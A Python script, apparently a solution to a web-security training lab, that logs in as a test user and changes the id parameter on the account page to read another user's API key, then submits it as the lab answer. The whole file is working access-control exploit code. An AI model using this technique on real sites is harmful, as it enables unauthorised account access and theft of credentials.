import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, login_url):
    response = session.get(login_url,verify=False,proxies=proxies_setting)
    soup = BeautifulSoup(response.text,'html.parser')
    csrf = soup.find('input',{'name': 'csrf'})['value']
    return csrf

def login_session(session, base_url):
    login_url = f"{base_url}/login"
    csrf_token = get_csrf_token(session, login_url)
    credential = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }
    response = session.post(login_url, data=credential,verify=False, proxies=proxies_setting)
    if "Log out" in response.text:
        print("(+) Login exitoso con user wiener")
        return True
    else:
        print("(-) Login fallido")
        return False

def api_key_carlos(session, base_url):
    url_login_id= f'{base_url}/my-account?id=carlos'
    response = session.get(url_login_id,allow_redirects=False,verify=False,proxies=proxies_setting)
    if "carlos" in response.text:
        print("(+) Login exitoso con user carlos")
        
        match = re.findall(r'Your API Key is: ([^<]+)',response.text)
        api_key = match[0]
        print(api_key)
        return api_key
    else:
        print("(-) Login fallido con user carlos")
    
def submit_solution(session, base_url):
    key_carlos = api_key_carlos(session,base_url)
    url_submit = f"{base_url}/submitSolution"
    data = {'answer': key_carlos}
    print(data)
    response = session.post(url_submit,data=data,verify=False,proxies=proxies_setting)
    if "true" in response.text:
        print("(+) Lab resuelto")
    else:
        print("(-) Lab No resuelto")
def main():
    if len(sys.argv) !=2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.example.com")
        exit(-1)
        
    session = requests.session()
    base_url = sys.argv[1]
    if login_session(session, base_url):
        submit_solution(session,base_url)
            

if __name__ == "__main__":
    main()